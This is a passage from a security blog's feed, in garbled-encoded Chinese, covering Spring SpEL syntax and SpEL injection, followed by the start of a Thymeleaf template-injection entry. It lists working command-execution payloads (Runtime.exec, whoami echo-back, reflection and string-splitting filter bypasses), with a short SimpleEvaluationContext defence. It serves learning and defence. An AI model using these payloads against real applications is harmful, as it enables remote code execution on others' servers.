è¿˜å¯ä»¥é“¾å¼æ“ä½œï¼š<code>#&#123;car.toString()&#125;</code></li></ul><p>å…¶ä¸­å±æ€§åç§°å¼•ç”¨è¿˜å¯ä»¥ç”¨<code>$</code>ç¬¦å· å¦‚ï¼š<code>$&#123;someProperty&#125;</code></p><blockquote><p>è¿™é‡Œéœ€è¦æ³¨æ„#{}å’Œ${}çš„åŒºåˆ«ï¼š</p><ul><li>#{}å°±æ˜¯SpELçš„å®šç•Œç¬¦ï¼Œç”¨äºæŒ‡æ˜å†…å®¹æœªSpELè¡¨è¾¾å¼å¹¶æ‰§è¡Œï¼›</li><li>${}ä¸»è¦ç”¨äºåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ä¸­çš„å€¼ï¼›</li><li>ä¸¤è€…å¯ä»¥æ··åˆä½¿ç”¨ï¼Œä½†æ˜¯å¿…é¡»#{}åœ¨å¤–é¢ï¼Œ${}åœ¨é‡Œé¢ï¼Œå¦‚#{â€˜${}â€™}ï¼Œæ³¨æ„å•å¼•å·æ˜¯å­—ç¬¦ä¸²ç±»å‹æ‰æ·»åŠ çš„ï¼›</li></ul></blockquote><p>é™¤æ­¤ä»¥å¤–åœ¨SpELä¸­ï¼Œä½¿ç”¨<code>T()</code>è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»ä½œç”¨åŸŸçš„æ–¹æ³•å’Œå¸¸é‡ï¼Œæƒ³ä½¿ç”¨æŸä¸ªç±»å°±å¯ä»¥åƒå‰é¢çš„demoä¸€æ ·</p><p>æ³¨æ„é™¤äº†java.langåŒ…ä¸‹çš„ç±»ï¼Œå…¶ä»–ç±»éƒ½è¦ç”¨å…¨ç±»åçš„å½¢å¼ã€‚</p><p><strong>å„ç§æ“ä½œç¬¦</strong></p><p>å‰é¢æˆ‘ä»¬å°†è¾“å…¥çš„å‚æ•°ç›´æ¥å½“æˆSpELè¡¨è¾¾å¼å»æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æ²¡æœ‰è¾“å…¥<code>#&#123;&#125;</code>ï¼Œä½†æ˜¯å¦‚æœç”¨@Valueå»è·å–å€¼æ‰§è¡Œå°±éœ€è¦äº†ï¼Œä¸‹é¢æ˜¯ä¸€äº›è¡¨è¾¾å¼ç¤ºä¾‹ï¼š</p><p><strong>ç®—æœ¯è¿ç®—</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//é™¤æ³•å’Œæ¨¡è¿ç®—å…·æœ‰å­—æ¯åˆ«åï¼Œdivä»£è¡¨/ï¼Œmodä»£è¡¨ï¼…ã€‚ +è¿ç®—ç¬¦è¿˜å¯ç”¨äºè¿æ¥å­—ç¬¦ä¸²ã€‚</span><br><span class="hljs-meta">@Value(&quot;#&#123;&#x27;string1&#x27;+&#x27;string2&#x27;&#125;&quot;)</span> <span class="hljs-comment">//å­—ç¬¦ä¸²æ‹¼æ¥</span><br><span class="hljs-keyword">private</span> String name;<br><br><span class="hljs-meta">@Value(&quot;#&#123;(2 + 2) * 2 + 9&#125;&quot;)</span> <span class="hljs-comment">// 17  è¡¨è¾¾å¼è®¡ç®—</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">double</span> brackets;<br></code></pre></td></tr></table></figure><p><strong>å…³ç³»å’Œé€»è¾‘æ“ä½œ</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;1 == 1&#125;&quot;)</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> equal;<br><br><span class="hljs-meta">@Value(&quot;#&#123;1 eq 1&#125;&quot;)</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> equalAlphabetic;<br></code></pre></td></tr></table></figure><p><strong>æ¡ä»¶è¿ç®—</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;2 &gt; 1 ? &#x27;a&#x27; : &#x27;b&#x27;&#125;&quot;)</span> <span class="hljs-comment">// &quot;a&quot;</span><br><span class="hljs-keyword">private</span> String ternary;<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼</strong></p><p><code>matchs</code>è¿ç®—ç¬¦å¯ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä¸ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;&#x27;100fghdjf&#x27; matches &#x27;\\d+&#x27; &#125;&quot;)</span> <span class="hljs-comment">// false</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> invalidNumericStringResult;<br><br><span class="hljs-meta">@Value(&quot;#&#123;&#x27;valid alphabetic string&#x27; matches &#x27;[a-zA-Z\\s]+&#x27; &#125;&quot;)</span> <span class="hljs-comment">// true</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> validAlphabeticStringResult;<br></code></pre></td></tr></table></figure><p><strong>è®¿é—®Listå’ŒMapå¯¹è±¡</strong></p><p>æˆ‘ä»¬å¯ä»¥è®¿é—®ä¸Šä¸‹æ–‡ä¸­ä»»ä½•Mapæˆ–Listçš„å€¼</p><p>æ¯”å¦‚è¿™é‡Œåˆ›å»ºä¸€ä¸ªbean</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component(&quot;workersHolder&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkersHolder</span> &#123;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; workers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> Map&lt;String, Integer&gt; salaryByWorkers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WorkersHolder</span><span class="hljs-params">()</span> &#123;<br>        workers.add(<span class="hljs-string">&quot;John&quot;</span>);<br>        workers.add(<span class="hljs-string">&quot;Susie&quot;</span>);<br>        workers.add(<span class="hljs-string">&quot;Alex&quot;</span>);<br>        workers.add(<span class="hljs-string">&quot;George&quot;</span>);<br><br>        salaryByWorkers.put(<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-number">35000</span>);<br>        salaryByWorkers.put(<span class="hljs-string">&quot;Susie&quot;</span>, <span class="hljs-number">47000</span>);<br>        salaryByWorkers.put(<span class="hljs-string">&quot;Alex&quot;</span>, <span class="hljs-number">12000</span>);<br>        salaryByWorkers.put(<span class="hljs-string">&quot;George&quot;</span>, <span class="hljs-number">14000</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//Getters and setters</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®å…¶ä¸­çš„å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.salaryByWorkers[&#x27;John&#x27;]&#125;&quot;)</span> <span class="hljs-comment">// 35000</span><br><span class="hljs-keyword">private</span> Integer johnSalary;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.salaryByWorkers[&#x27;George&#x27;]&#125;&quot;)</span> <span class="hljs-comment">// 14000</span><br><span class="hljs-keyword">private</span> Integer georgeSalary;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.salaryByWorkers[&#x27;Susie&#x27;]&#125;&quot;)</span> <span class="hljs-comment">// 47000</span><br><span class="hljs-keyword">private</span> Integer susieSalary;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.workers[0]&#125;&quot;)</span> <span class="hljs-comment">// John</span><br><span class="hljs-keyword">private</span> String firstWorker;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.workers[3]&#125;&quot;)</span> <span class="hljs-comment">// George</span><br><span class="hljs-keyword">private</span> String lastWorker;<br><br><span class="hljs-meta">@Value(&quot;#&#123;workersHolder.workers.size()&#125;&quot;)</span> <span class="hljs-comment">// 4</span><br><span class="hljs-keyword">private</span> Integer numberOfWorkers;<br></code></pre></td></tr></table></figure><p><strong>$ç•Œå®šç¬¦</strong></p><p>å¯ä»¥è®¿é—®application.propertiesæ–‡ä»¶çš„å±æ€§å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241214135525790.png" alt="image-20241214135525790"></p><h1 id="spelè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"><a href="#SpElè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="headerlink" title="SpElè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"></a>SpElè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</h1><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>Springæä¾›äº†ä¸¤ä¸ªEvaluationContextï¼š<code>SimpleEvaluationContext</code>å’Œ<code>StandardEvaluationContext</code>ï¼š</p><ul><li>SimpleEvaluationContext - é’ˆå¯¹ä¸éœ€è¦SpELè¯­è¨€è¯­æ³•çš„å…¨éƒ¨èŒƒå›´å¹¶ä¸”åº”è¯¥å—åˆ°æœ‰æ„é™åˆ¶çš„è¡¨è¾¾å¼ç±»åˆ«ï¼Œå…¬å¼€SpELè¯­è¨€ç‰¹æ€§å’Œé…ç½®é€‰é¡¹çš„å­é›†ã€‚</li><li>StandardEvaluationContext - å…¬å¼€å…¨å¥—SpELè¯­è¨€åŠŸèƒ½å’Œé…ç½®é€‰é¡¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æŒ‡å®šé»˜è®¤çš„æ ¹å¯¹è±¡å¹¶é…ç½®æ¯ä¸ªå¯ç”¨çš„è¯„ä¼°ç›¸å…³ç­–ç•¥ã€‚</li></ul><p>ç„¶åSpringé»˜è®¤é‡‡ç”¨çš„å°±æ˜¯StandardEvaluationContextï¼Œæˆ‘ä»¬è‡ªå·±å»è°ƒè¯•ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ï¼Œåœ¨å‰é¢demoä»£ç ä¸­æ‰§è¡ŒgetValueæ–¹æ³•è·å–è¡¨è¾¾å¼ç»“æœè¿”å›çš„è¿‡ç¨‹ä¸­ä¼šç»™contextèµ‹å€¼ï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://cdn.clown2024.cn/image-20241214140834474.png" alt="image-20241214140834474"></p><h2 id="å¸¸ç”¨payloadæ•´ç†"><a href="#å¸¸ç”¨payloadæ•´ç†" class="headerlink" title="å¸¸ç”¨payloadæ•´ç†"></a>å¸¸ç”¨payloadæ•´ç†</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">$&#123;<span class="hljs-number">12</span>*<span class="hljs-number">12</span>&#125;<br>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;open -na Calculator&quot;</span>)<br>T(Thread).sleep(<span class="hljs-number">10000</span>)<br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class="hljs-string">&#x27;calc.exe&#x27;</span>)<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-string">&#x27;open -na Calculator&#x27;</span>).start()<br></code></pre></td></tr></table></figure><p><strong>å›æ˜¾</strong></p><p>è¿˜å­¦åˆ°ä¸€ä¸ªåˆ©ç”¨org.apache.commons.ioè¿›è¡Œå›æ˜¾çš„æ“ä½œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream())<br></code></pre></td></tr></table></figure><p>ä½†å‰ææ˜¯å¼•å…¥äº†commons-ioçš„ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.11.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>ç»•è¿‡</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åå°„ç»•è¿‡</span><br>T(String).class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>).exec(<span class="hljs-string">&quot;open%20-na%20Calculator&quot;</span>)<br><br><span class="hljs-comment">// + ä¸€å®šè¦ç”¨urlç¼–ç ï¼Œä¸ç„¶æµè§ˆå™¨è§£æä¼šæœ‰é—®é¢˜</span><br>T(String).class.forName(<span class="hljs-string">&quot;java.lang.Ru&quot;</span>%2b<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>%2b<span class="hljs-string">&quot;ntime&quot;</span>).invoke(<span class="hljs-literal">null</span>).exec(<span class="hljs-string">&quot;open%20-na%20Calculator&quot;</span>)<br><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-literal">null</span>).getClass().getMethod(<span class="hljs-string">&quot;exec&quot;</span>,T(String)).invoke(T(java.lang.Runtime).getRuntime(),<span class="hljs-string">&quot;open%20-na%20Calculator&quot;</span>)<br><br><span class="hljs-comment">//ä½¿ç”¨ScriptEngineManageræ„é€ </span><br>T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -na Calculator&#x27;)&quot;</span>)<br><br>T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;java.lang.Runt&quot;</span>%2b<span class="hljs-string">&quot;ime.getRu&quot;</span>%2b<span class="hljs-string">&quot;ntime().e&quot;</span>%2b<span class="hljs-string">&quot;xec(&#x27;open -na Calculator&#x27;)&quot;</span>)<br><br><br><span class="hljs-comment">//å¼•å·è¢«è¿‡æ»¤ï¼Œåˆ©ç”¨ç”Ÿæˆä»»æ„å­—ç¬¦+concatå‡½æ•°é‡‡å–å­—ç¬¦ä¸²æ‹¼æ¥</span><br>T(java.lang.Character).toString(<span class="hljs-number">97</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">98</span>))<br></code></pre></td></tr></table></figure><p><strong>å›æ˜¾é—®é¢˜</strong></p><p>æ ¹æ®å‰é¢çš„demoæ‰¾äº†å‡ ä¸ªèƒ½å¤Ÿå°†å‘½ä»¤ç»“æœå›æ˜¾å‡ºæ¥çš„payload</p><p>åˆ©ç”¨StreamUtils</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream()))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214142327992.png" alt="image-20241214142327992"></p><p>è¿˜æœ‰ç”¨BufferedReaderå°è£…</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream())).readLine()<br></code></pre></td></tr></table></figure><p>ä¸è¿‡åªèƒ½è¯»å–ä¸€è¡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241214142701880.png" alt="image-20241214142701880"></p><p>åˆ©ç”¨Scanner</p><p>åŸç†åœ¨äº<code>Scanner#useDelimiter</code>æ–¹æ³•ä½¿ç”¨æŒ‡å®šçš„å­—ç¬¦ä¸²åˆ†å‰²è¾“å‡ºï¼Œå°±ä¼šè®©æ‰€æœ‰çš„å­—ç¬¦éƒ½åœ¨ç¬¬ä¸€è¡Œï¼Œç„¶åæ‰§è¡Œnextæ–¹æ³•å³å¯è·å¾—æ‰€æœ‰è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/spelTest?message=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;).getInputStream()).useDelimiter(&quot;%5C%5CA&quot;).next()<br></code></pre></td></tr></table></figure><p>é€šè¿‡urlä¼ è¾“éœ€è¦ç»™\urlç¼–ç ä¸€ä¸‹ï¼Œå› ä¸ºå±äºéæ³•å­—ç¬¦</p><p><img src="https://cdn.clown2024.cn/image-20241214143839106.png" alt="image-20241214143839106"></p><blockquote><p><code>useDelimiter</code> æ–¹æ³•ç”¨äºè®¾ç½® <code>Scanner</code> çš„åˆ†éš”ç¬¦ã€‚<code>&quot;\\A&quot;</code> æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œè¡¨ç¤ºè¾“å…¥æµçš„å¼€å¤´ã€‚ä½¿ç”¨è¿™ä¸ªåˆ†éš”ç¬¦å¯ä»¥è®© <code>Scanner</code> è¯»å–æ•´ä¸ªè¾“å…¥æµï¼Œç›´åˆ°ç»“æŸã€‚</p></blockquote><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><p>å› ä¸ºSpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡è¡¨è¾¾å¼æ‰§è¡Œç²¾å¿ƒæ„é€ çš„ä»»æ„ä»£ç ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚ä¸ºäº†é˜²å¾¡è¯¥ç±»æ¼æ´ï¼ŒSpringå®˜æ–¹æ¨å‡ºäº†<code>SimpleEvaluationContext</code>ä½œä¸ºå®‰å…¨ç±»æ¥é˜²å¾¡è¯¥ç±»æ¼æ´ã€‚</p><p><code>SimpleEvaluationContext</code> æ—¨åœ¨ä»…æ”¯æŒ SpEL è¯­è¨€è¯­æ³•çš„ä¸€ä¸ªå­é›†ã€‚å®ƒä¸åŒ…æ‹¬ Java ç±»å‹å¼•ç”¨ï¼Œæ„é€ å‡½æ•°å’Œ bean å¼•ç”¨ï¼›æ‰€ä»¥æœ€ç›´æ¥çš„ä¿®å¤æ–¹å¼æ˜¯ä½¿ç”¨ <code>SimpleEvaluationContext</code>â€‰æ›¿æ¢ <code>StandardEvaluationContext</code>ã€‚</p><p>ç”¨æ³•ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(message);<br><span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(message).build();<br><span class="hljs-keyword">return</span> expression.getValue(context).toString();<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/01.%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/10.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/01.%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/10.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F</a></p><p><a href="https://jishu.dev/2021/05/23/spring-expression-language/">https://jishu.dev/2021/05/23/spring-expression-language/</a></p><p><a href="http://www.bmth666.cn/2023/04/15/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2023/04/15/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html</a></p><p><a href="https://dragonkeeep.top/category/SPEL/index.html">https://dragonkeeep.top/category/SPEL/index.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;èµ¶ç´§æ¥è¡¥ä¸€ä¸‹SPELè¡¨è¾¾å¼æ³¨å…¥ï¼Œå‰é¢Thymeleafæœ¬è´¨ç”¨çš„å°±æ˜¯SPELè¡¨è¾¾å¼&lt;/p&gt;
&lt;h1 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h1&gt;&lt;p&gt;Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆç®€ç§° &lt;strong</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>thymeleafæ¨¡æ¿æ³¨å…¥</title>
    <link href="https://clowsman.github.io/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>https://clowsman.github.io/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2024-12-12T16:09:58.000Z</published>
    <updated>2024-12-13T16:58:34.139Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å®åœ¨æ˜¯ä¸çŸ¥é“çœ‹ä»€ä¹ˆäº†ï¼Œæ¥å­¦ä¸€ä¸‹å’Œjavaç›¸å…³çš„ä¸€äº›sstiå§ï¼Œå…ˆä»thymeleafå¼€å§‹</p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>Thymeleafå°±æ˜¯ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œå’Œpythonçš„jinjia2ä¸€æ ·ï¼Œå°±ä¸éœ€è¦è¿‡å¤šä»‹ç»äº†</p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a></p><p>é«˜ç‰ˆæœ¬SpringBoot&#x2F;Thymeleafä¸å­˜åœ¨æ¨¡æ¿æ³¨å…¥é—®é¢˜ï¼Œè¿™é‡ŒSpringBootç‰ˆæœ¬ä¸º2.5.10(å®æµ‹å¾—2.4.1ï¼Œ2.5.10å·²ç»ä¸è¡Œäº†)ï¼ŒThymeleafåŒä¸Š</p><h1 id="demoç¤ºä¾‹"><a href="#Demoç¤ºä¾‹" class="headerlink" title="Demoç¤ºä¾‹"></a>Demoç¤ºä¾‹</h1><p>é¦–å…ˆå°±æ˜¯åˆ›å»ºä¸€ä¸ªspringbooté¡¹ç›®ï¼Œæˆ‘ä»¬çš„thymeleafæ–‡ä»¶å°±å†™åœ¨templatesç›®å½•ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241213110130755.png" alt="image-20241213110130755"></p><p>åˆ›å»ºé¡¹ç›®çš„æ—¶å€™å¯ä»¥å‹¾é€‰thymeleafæ¨¡æ¿å¼•æ“</p><p><img src="https://cdn.clown2024.cn/image-20241213110353299.png" alt="image-20241213110353299"></p><p>ä¸€ä¸ªåŸºç¡€çš„index.html</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>hello ç¬¬ä¸€ä¸ªThymeleafç¨‹åº<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;name&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>controller</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/demo&quot;)</span><br><span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo</span><span class="hljs-params">(Model model)</span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç”¨<code>@Controller</code>æ³¨è§£æ‰è¡Œï¼Œå› ä¸ºè¯¥æ³¨è§£ä¸»è¦ä½œç”¨æ˜¯è¿”å›è§†å›¾åç§°ï¼Œè¿™äº›è§†å›¾åç§°ä¼šè¢«Springçš„è§†å›¾è§£æå™¨ï¼ˆView Resolverï¼‰è§£æï¼Œä»è€Œæ‰¾åˆ°å¯¹åº”çš„æ¨¡æ¿æ–‡ä»¶ï¼ˆå¦‚Thymeleafæ¨¡æ¿ï¼‰ï¼Œå¹¶å°†æ¨¡å‹æ•°æ®æ¸²æŸ“åˆ°æ¨¡æ¿ä¸­ï¼Œæœ€ç»ˆç”Ÿæˆå“åº”ç»™å®¢æˆ·ç«¯çš„è§†å›¾ã€‚</p><p><code>@RestController</code>æ³¨è§£æ˜¯<code>@Controller</code>å’Œ<code>@ResponseBody</code>çš„ç»„åˆï¼Œå®ƒé€šå¸¸ç”¨äºåˆ›å»ºRESTful WebæœåŠ¡ã€‚<code>@RestController</code>æ³¨è§£çš„æ§åˆ¶å™¨æ–¹æ³•çš„è¿”å›å€¼ä¼šè‡ªåŠ¨ä½œä¸ºHTTPå“åº”çš„æ­£æ–‡è¿”å›ï¼Œè¿™æ„å‘³ç€è¿”å›å€¼ä¸ä¼šè¢«è§†å›¾è§£æå™¨å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥å†™å…¥HTTPå“åº”ä½“ä¸­ã€‚</p><h1 id="ä¸€äº›è¯­æ³•"><a href="#ä¸€äº›è¯­æ³•" class="headerlink" title="ä¸€äº›è¯­æ³•"></a>ä¸€äº›è¯­æ³•</h1><p>thymeleafçš„htmlæ–‡ä»¶é¦–å…ˆè¦åŒ…å«è¿™ä¸ª</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure><p><strong>æ ‡ç­¾</strong></p><table><thead><tr><th>æ 